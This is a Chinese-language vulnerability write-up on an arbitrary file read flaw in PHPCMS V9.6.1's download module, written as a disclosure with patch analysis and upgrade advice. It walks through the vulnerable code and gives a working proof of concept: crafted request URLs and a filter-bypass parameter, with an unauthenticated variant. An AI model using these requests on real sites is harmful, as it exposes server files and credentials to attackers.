
# 【漏洞分析】PHPCMS V9.6.1 任意文件读取漏洞分析（含PoC，已有补丁）


                                阅读量   
                                **621048**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](./img/86007/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](./img/86007/t01882da1bcc9242166.png)](./img/86007/t01882da1bcc9242166.png)**

****

作者：[**0r3ak@0kee Team**](http://bobao.360.cn/member/contribute?uid=1056944258)

预估稿费：500RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**前言**

PHPCMS于今天（2017年5月3日）下午已发布9.6.2版本修复了该漏洞。PHPCMS V9.6.1是前段时间PHPCMS官方于4月12号推出的版本，修复了4月上旬公开的两个高危漏洞，一个前台注册接口的Getshell，另外一个是down模块的SQL注入漏洞：

PHPCMS V9.6.1 版本信息：

[![](./img/86007/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0160ee6ab8fa3ad7e5.png)

由于任意文件读取漏洞与down模块的SQL注入的问题出现在同一个类，那么先来回顾SQL注入的修复方式：

[![](./img/86007/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a3f7f92b24d4c28a.png)

修复方式很常规的，将之前忽略的整型id参数给intval起来了，话说phpcms修复漏洞方式都是简单粗暴，哪里有漏洞补哪里。

由于漏洞出现在PHPCMS V9.6.1里面代码里面（9.6.0以及之前的版本不存在），所以官方在修复了前面两个高危后再出了V9.6.1，检查了一下SQL注入与getshell漏洞的修复方式后就没去再仔细跟新版的代码，直到外界放出了声音后就仔细跟进了。

<br>

**漏洞技术分析**

**漏洞描述**

**漏洞危害：**读取系统任意文件

**影响版本：**Phpcms V9.6.1 Release 20170412

**官方补丁：**已发布（详情请见下文修复方案）

**漏洞成因**

此次的任意文件读取漏洞也出现在down类中，上次的sql注入也是这里的坑，所以应该叫继续分析吧，先来看漏洞触发点：

/phpcms/modules/content/down.php Line 103-127



```
if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(.|$)/i',$f) || strpos($f, ":\")!==FALSE || strpos($f,'..')!==FALSE) showmessage(L('url_error'));
        $fileurl = trim($f);
        if(!$downid || empty($fileurl) || !preg_match("/[0-9]{10}/", $starttime) || !preg_match("/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/", $ip) || $ip != ip()) showmessage(L('illegal_parameters'));    
        $endtime = SYS_TIME - $starttime;
        if($endtime &gt; 3600) showmessage(L('url_invalid'));
        if($m) $fileurl = trim($s).trim($fileurl);
       if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(.|$)/i',$fileurl) ) showmessage(L('url_error'));
        //远程文件
        if(strpos($fileurl, ':/') &amp;&amp; (strpos($fileurl, pc_base::load_config('system','upload_url')) === false)) { 
            header("Location: $fileurl");
        } else {
            if($d == 0) {
                header("Location: ".$fileurl);
            } else {
                $fileurl = str_replace(array(pc_base::load_config('system','upload_url'),'/'), array(pc_base::load_config('system','upload_path'),DIRECTORY_SEPARATOR), $fileurl);
                $filename = basename($fileurl);
                //处理中文文件
                if(preg_match("/^([sS]*?)([x81-xfe][x40-xfe])([sS]*?)/", $fileurl)) {
                    $filename = str_replace(array("%5C", "%2F", "%3A"), array("\", "/", ":"), urlencode($fileurl));
                    $filename = urldecode(basename($filename));
                }
                $ext = fileext($filename);
                $filename = date('Ymd_his').random(3).'.'.$ext;
                $fileurl = str_replace(array('&lt;','&gt;'), '',$fileurl);
                file_down($fileurl, $filename);
```

最后一行有file_down函数，跟进去看一下：phpcms/libs/functions/global.fun.php  Line 1187-1204



```
function file_down($filepath, $filename = '') {
    if(!$filename) $filename = basename($filepath);
    if(is_ie()) $filename = rawurlencode($filename);
    $filetype = fileext($filename);
    $filesize = sprintf("%u", filesize($filepath));
    if(ob_get_length() !== false) @ob_end_clean();
    header('Pragma: public');
    header('Last-Modified: '.gmdate('D, d M Y H:i:s') . ' GMT');
    header('Cache-Control: no-store, no-cache, must-revalidate');
    header('Cache-Control: pre-check=0, post-check=0, max-age=0');
    header('Content-Transfer-Encoding: binary');
    header('Content-Encoding: none');
    header('Content-type: '.$filetype);
    header('Content-Disposition: attachment; filename="'.$filename.'"');
    header('Content-length: '.$filesize);
    readfile($filepath);
    exit;
}
```

就一个普通的文件下载方法，当$fileurl传入后会去下载指定文件，再回到down.php文件中，在执行file_down前是走了几次判断：

（1）首先从头到尾判断$f参数中是否有php等服务端脚本文件，再看看是否带有”:\”外链文件，是否”..”目录跳转，满足其中一个条件就返回True。

```
if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(.|$)/i',$f) || strpos($f, ":\")!==FALSE || strpos($f,'..')!==FALSE) showmessage(L('url_error'));
```

满足后执行show message抛出错误信息，虽然没有exit结束程序，但是咱们的file_down是在二级if分支的else里面的，无法执行到目标函数。 

（2）接着$f的值赋给了$fileurl参数，再做了一次内容判断。

```
if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(.|$)/i',$fileurl) ) showmessage(L('url_error'));
```

（3）将$s与$fileurl拼接起来，而$fileurl就是前面可控的$f：

```
if($m) $fileurl = trim($s).trim($fileurl);
```

（4）处理远程文件，如果是外链文件的话直接跳转到目标地址。



```
if(strpos($fileurl, ':/') &amp;&amp; (strpos($fileurl, pc_base::load_config('system','upload_url')) === false)) {
     header("Location: $fileurl");
}
```

接着走到else分支里面的str_replace，将$fileurl参数中的所有”&gt;”、”&lt;“参数替换为空值，这也是出现问题的函数，前面的后缀/目录跳转判断均可以绕过，可以发现需要控制的参数有 $s、$f，这俩参数在init函数中传进来的：

/phpcms/modules/content/down.php Line 76-84



```
if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(.|$)/i',$f) || strpos($f, ":\")!==FALSE || strpos($f,'..')!==FALSE) showmessage(L('url_error'));
        if(strpos($f, 'http://') !== FALSE || strpos($f, 'ftp://') !== FALSE || strpos($f, '://') === FALSE) {
            $pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT'].'down');
            $a_k = urlencode(sys_auth("i=$i&amp;d=$d&amp;s=$s&amp;t=".SYS_TIME."&amp;ip=".ip()."&amp;m=".$m."&amp;f=$f&amp;modelid=".$modelid, 'ENCODE', $pc_auth_key));
            $downurl = '?m=content&amp;c=down&amp;a=download&amp;a_k='.$a_k;
        } else {
            $downurl = $f;            
        }
        include template('content','download');
```

这一块其实是down-&gt;init()的内容，将参数传到$a_k并进行sys_auth加密，然后传给了下面的download函数，这里的$a_k已经进行了encode加密操作：

init函数与download函数中的$a_k变量保持加／解密钥的一致性：



```
if(strpos($f, 'http://') !== FALSE || strpos($f, 'ftp://') !== FALSE || strpos($f, '://') === FALSE) {
            $pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT'].'down');
            $a_k = urlencode(sys_auth("i=$i&amp;d=$d&amp;s=$s&amp;t=".SYS_TIME."&amp;ip=".ip()."&amp;m=".$m."&amp;f=$f&amp;modelid=".$modelid, 'ENCODE', $pc_auth_key));
…
…
public function download() {
        $a_k = trim($_GET['a_k']);
        $pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT'].'down');
        $a_k = sys_auth($a_k, 'DECODE', $pc_auth_key);
```

密钥key：

```
$pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT'].'down');
```

再往下跟进：



```
public function download() {
        $a_k = trim($_GET['a_k']);
        $pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT'].'down');
        $a_k = sys_auth($a_k, 'DECODE', $pc_auth_key);
        if(empty($a_k)) showmessage(L('illegal_parameters'));
        unset($i,$m,$f,$t,$ip);
        $a_k = safe_replace($a_k);
        parse_str($a_k);        
        if(isset($i)) $downid = intval($i);
        if(!isset($m)) showmessage(L('illegal_parameters'));
        if(!isset($modelid)) showmessage(L('illegal_parameters'));
        if(empty($f)) showmessage(L('url_invalid'));
        if(!$i || $m&lt;0) showmessage(L('illegal_parameters'));
        if(!isset($t)) showmessage(L('illegal_parameters'));
        if(!isset($ip)) showmessage(L('illegal_parameters'));
        $starttime = intval($t);
```

变量s和f来源于变量a_k带入parse_str解析，注意a_k在down-&gt;init()中经过safe_replace处理过一次，经过sys_auth解密，key无法获取，所以需要让系统来为我们生成加密串a_k：

/phpcms/modules/content/down.php Line 11-18



```
public function init() {
        $a_k = trim($_GET['a_k']);
        if(!isset($a_k)) showmessage(L('illegal_parameters'));
        $a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system','auth_key'));
        if(empty($a_k)) showmessage(L('illegal_parameters'));
        unset($i,$m,$f);
        $a_k = safe_replace($a_k);
        parse_str($a_k);
```

可以看出这里跟上次的sql注入点一样，获取了a_k进行了一次DECODE，那么咱们就需要一个加密好的key，最好的办法还是采用attachments模块的swfupload_json的加密cookie方法(跟之前的注入payload加密一个套路)，这也是采用了phpcms功能的特性吧：

/phpcms/modules/attachment/attachments.php LINE 239-253



```
/**
     * 设置swfupload上传的json格式cookie
     */
    public function swfupload_json() {
        $arr['aid'] = intval($_GET['aid']);
        $arr['src'] = safe_replace(trim($_GET['src']));
        $arr['filename'] = urlencode(safe_replace($_GET['filename']));
        $json_str = json_encode($arr);
        $att_arr_exist = param::get_cookie('att_json');
        $att_arr_exist_tmp = explode('||', $att_arr_exist);
        if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {
            return true;
        } else {
            $json_str = $att_arr_exist ? $att_arr_exist.'||'.$json_str : $json_str;
            param::set_cookie('att_json',$json_str);
            return true;            
        }
    }
```

注意了这里也有一次safe_replace，加密函数在：param::set_cookie('att_json',$json_str);，跟进一下：

/phpcms/libs/classes/param.class.php LINE 86-99



```
public static function set_cookie($var, $value = '', $time = 0) {
        $time = $time &gt; 0 ? $time : ($value == '' ? SYS_TIME - 3600 : 0);
        $s = $_SERVER['SERVER_PORT'] == '443' ? 1 : 0;
        $httponly = $var=='userid'||$var=='auth'?true:false;
        $var = pc_base::load_config('system','cookie_pre').$var;
        $_COOKIE[$var] = $value;
        if (is_array($value)) {
            foreach($value as $k=&gt;$v) {
                setcookie($var.'['.$k.']', sys_auth($v, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s, $httponly);
            }
        } else {
            setcookie($var, sys_auth($value, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s, $httponly);
        }
    }
```

sys_auth($value, 'ENCODE')即是利用了phpcms内置的加密函数进行数据加密，结果正好是咱们需要的，再看看attachments.php中是否有相关权限的验证：

构造方法：

/phpcms/modules/attachment/attachments.php LINE 10-24



```
class attachments {
    private $att_db;
    function __construct() {
        pc_base::load_app_func('global');
        $this-&gt;upload_url = pc_base::load_config('system','upload_url');
        $this-&gt;upload_path = pc_base::load_config('system','upload_path');        
        $this-&gt;imgext = array('jpg','gif','png','bmp','jpeg');
        $this-&gt;userid = $_SESSION['userid'] ? $_SESSION['userid'] : (param::get_cookie('_userid') ? param::get_cookie('_userid') : sys_auth($_POST['userid_flash'],'DECODE'));
        $this-&gt;isadmin = $this-&gt;admin_username = $_SESSION['roleid'] ? 1 : 0;
        $this-&gt;groupid = param::get_cookie('_groupid') ? param::get_cookie('_groupid') : 8;
        //判断是否登录
        if(empty($this-&gt;userid)){
            showmessage(L('please_login','','member'));
        }
    }
$this-&gt;userid = $_SESSION['userid'] ? $_SESSION['userid'] : (param::get_cookie('_userid') ? param::get_cookie('_userid') : sys_auth($_POST['userid_flash'],'DECODE'));
```

从这里的userid来看是需要普通用户的权限



```
if(empty($this-&gt;userid)){
            showmessage(L('please_login','','member'));
        }
```

但是也可以传进加密后的userid_flash参数：sys_auth($_POST['userid_flash'],'DECODE'));  那么这里有两种利用方案，一种是直接通过phpcms会员中心登录获取的cookie中的userid做权限判断，还有一种方式是通过现成的经过sys_auth加密后的字符串去赋值给当前的userid，这里找到了一处，是利用了wap模块的构造方法：

/phpcms/modules/wap/index.php



```
class index {
    function __construct() {        
        $this-&gt;db = pc_base::load_model('content_model');
        $this-&gt;siteid = isset($_GET['siteid']) &amp;&amp; (intval($_GET['siteid']) &gt; 0) ? intval(trim($_GET['siteid'])) : (param::get_cookie('siteid') ? param::get_cookie('siteid') : 1);
        param::set_cookie('siteid',$this-&gt;siteid);    
        $this-&gt;wap_site = getcache('wap_site','wap');
        $this-&gt;types = getcache('wap_type','wap');
        $this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid];
        define('WAP_SITEURL', $this-&gt;wap['domain'] ? $this-&gt;wap['domain'].'index.php?' : APP_PATH.'index.php?m=wap&amp;siteid='.$this-&gt;siteid);
        if($this-&gt;wap['status']!=1) exit(L('wap_close_status'));
    }
```

set_cookie跟进去就是调用sys_auth 加密函数来加密外部获取的sited值，将这里的siteid值再带入上面的userid_flash即可。

接着再返回去看这两个可控参数：s=$s、f=$f，$s带需要读取的目标文件，$f带自己构造的绕过规则检测值：

```
$a_k = urlencode(sys_auth("i=$i&amp;d=$d&amp;s=$s&amp;t=".SYS_TIME."&amp;ip=".ip()."&amp;m=".$m."&amp;f=$f&amp;modelid=".$modelid, 'ENCODE’, $pc_auth_key));
```

经过反复测试，可以采用如下参数，这里以读取down.php文件源码为例：

```
s=./phpcms/modules/content/down.ph&amp;f=p%3%25252%2*70C
```

解释一下这里的参数，s参数带的是要读取的down.php的源码文件，最后的p是由f参数的第一个字符p拼接过去的：



```
$fileurl = trim($f);
        if(!$downid || empty($fileurl) || !preg_match("/[0-9]{10}/", $starttime) || !preg_match("/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/", $ip) || $ip != ip()) showmessage(L('illegal_parameters'));    
        $endtime = SYS_TIME - $starttime;
        if($endtime &gt; 3600) showmessage(L('url_invalid'));
        if($m) $fileurl = trim($s).trim($fileurl);
        if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(.|$)/i',$fileurl) ) showmessage(L('url_error'));
```

f=p%3%25252%2*70C ： f参数是绕过正则匹配检查的关键，最后咱们要构造这样的形式：./phpcms/modules/content/down.php&lt;，这样就能绕过所有匹配检测在最后的str_replace将”&lt;“给替换为空，紧接着就能带入读取文件了。

再看看分析过程中遇到的phpcms安全函数safe_replace:

/phpcms/libs/functions/global.func.php



```
function safe_replace($string) {
    $string = str_replace('%20','',$string);
    $string = str_replace('%27','',$string);
    $string = str_replace('%2527','',$string);
    $string = str_replace('*','',$string);
    $string = str_replace('"','&amp;quot;',$string);
    $string = str_replace("'",'',$string);
    $string = str_replace('"','',$string);
    $string = str_replace(';','',$string);
    $string = str_replace('&lt;','&amp;lt;',$string);
    $string = str_replace('&gt;','&amp;gt;',$string);
    $string = str_replace("{",'',$string);
    $string = str_replace('}','',$string);
    $string = str_replace('\','',$string);
    return $string;
}
```

从过滤内容来看直接带”&lt;“是不行的，需要构造参数，先来看看经过了几次过滤：

第一次参数得经过attachments-&gt;swfupload_json函数进行param::set_cookie加密:

[![](./img/86007/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e06779a2b329cc4c.png)

最后输出的f=p%3C 就是咱们想要的”&lt;“字符。



**漏洞利用**

**方案一：**

登录普通用户，访问链接：

```
http://localhost/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&amp;f=p%3%25252%2*70C
```

获取分配的att_json

[![](./img/86007/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01f4ecc91ffea7f201.png)

将这段json值带入到down类的init函数中去：

```
http://localhost/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=013ceMuDOmbKROPvvdV0SvY95fzhHTfURBCK4CSbrnbVp0HQOGXTxiHdRp2jM-onG9vE0g5SKVcO_ASqdLoOSsBvN7nFFopz3oZSTo2P7b6N_UB037kehz2lj12lFGtTsPETp-a0mAHXgyjn-tN7cw4nZdk10Mr2g5NM_x215AeqpOF6_mIF7NsXvWiZl35EmQ
```

点击下载后即可下载目标文件：

[![](./img/86007/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t017fb425ec63f5d73e.png)

**方案二：**

在未登录的情况下访问：

```
http://localhost/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1
```

获取当前的siteid

[![](./img/86007/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018394ba7fdf28c236.png)

再访问:



```
http://localhost/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&amp;f=p%3%25252%2*70C
POST_DATA:userid_flash=14e0uml6m504Lbwsd0mKpCe0EocnqxTnbfm4PPLW
```

[![](./img/86007/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t018c28643f0a107997.png)

**修复方案**

官方以及出了最新的补丁，补丁分析如下：

针对PHPCMS最新版本的特性，主要是因为down类中download方法在进入file_down函数前有如下代码：

```
$fileurl = str_replace(array('&lt;','&gt;'), '',$fileurl);
```

这样在前面就可以将”&lt;“或”&gt;”带入到download中的f参数中绕过正则匹配，所以修复方式就是可以在进行了str_replace后再正则匹配一下$fileurl参数的内容最后放入file_down函数中执行：

```
$fileurl = str_replace(array(pc_base::load_config('system','upload_url'),'/'), array(pc_base::load_config('system','upload_path'),DIRECTORY_SEPARATOR), $fileurl);
                $filename = basename($fileurl);
                //处理中文文件
                if(preg_match("/^([sS]*?)([x81-xfe][x40-xfe])([sS]*?)/", $fileurl)) {
                    $filename = str_replace(array("%5C", "%2F", "%3A"), array("\", "/", ":"), urlencode($fileurl));
                    $filename = urldecode(basename($filename));
                }
                $ext = fileext($filename);
                $filename = date('Ymd_his').random(3).'.'.$ext;
                $fileurl = str_replace(array('&lt;','&gt;'), '',$fileurl);
                if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(.|$)/i',$fileurl) || strpos($fileurl, ":\")!==FALSE || strpos($fileurl,'..')!==FALSE) {
                    showmessage(L('url_error'));
                }
                file_down($fileurl, $filename);
```

**1. 升级至V9.6.2官方最新版：**

GBK：[http://download.phpcms.cn/v9/9.6/phpcms_v9.6.2_GBK.zip](http://download.phpcms.cn/v9/9.6/phpcms_v9.6.2_GBK.zip)

UTF-8：[http://download.phpcms.cn/v9/9.6/phpcms_v9.6.2_UTF8.zip](http://www.phpcms.cn/index.php?m=content&amp;c=down&amp;a_k=1bae_myd-iB-LgZI_xMHsRVFMDRWusFe7iZNKlYE7ShJvbK6L3Yc-DhDmtEeFrwtwjim-eW_IPCiPvbufSKRxqIX85ga2Rx9_zsv85vpu2laDb7jVJN8YbLFfUMfjt94lTDRTitjum_sqfzBJEbi-q9IxVN9xm1N_A) 

**升级方法**

**方法一：**在线升级 步骤：登录后台-扩展-在线升级

**方法二：**手动升级（有二次开发并有改动默认程序）



[**[GBK补丁列表]**](http://download.phpcms.cn/v9/9.0/patch/gbk/)

[**[UTF-8补丁列表]**](http://download.phpcms.cn/v9/9.0/patch/utf8/)

**2. 个人修复建议（适用于有二次开发并改动默认程序的网站管理者）：**

针对PHPCMS最新版本的特性，主要是因为down类中download方法在进入file_down函数前有如下代码：

```
$fileurl = str_replace(array('&lt;','&gt;'), '',$fileurl);
```

这样在前面就可以将”&lt;“或”&gt;”带入到download中的f参数中绕过正则匹配，所以修复方式就是可以在进行了str_replace后再正则匹配一下$fileurl参数的内容最后放入file_down函数中执行：



```
$fileurl = str_replace(array(pc_base::load_config('system','upload_url'),'/'), array(pc_base::load_config('system','upload_path'),DIRECTORY_SEPARATOR), $fileurl);
                $filename = basename($fileurl);
                //处理中文文件
                if(preg_match("/^([sS]*?)([x81-xfe][x40-xfe])([sS]*?)/", $fileurl)) {
                    $filename = str_replace(array("%5C", "%2F", "%3A"), array("\", "/", ":"), urlencode($fileurl));
                    $filename = urldecode(basename($filename));
                }
                $ext = fileext($filename);
                $filename = date('Ymd_his').random(3).'.'.$ext;
                $fileurl = str_replace(array('&lt;','&gt;'), '',$fileurl);
                if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(.|$)/i',$fileurl) || strpos($fileurl, ":\")!==FALSE || strpos($fileurl,'..')!==FALSE) {
                    showmessage(L('url_error'));
                }
                file_down($fileurl, $filename);
```



**总结**

其实漏洞的核心在于外部参数可以被引入”&lt;“或”&gt;”来污染正常的参数来绕过代码里面的正则匹配，然后在执行文件读取之前被意外的清理了外部带入的污染参数”&lt;“或”&gt;”，漏洞利用得也是如此恰到好处，这也说明了在开发中进行参数过滤的同时是否将恶意参数完全阻挡在了敏感函数执行之前，使之进入敏感函数的参数完全是合法的，这也是开发过程中需要考虑的。
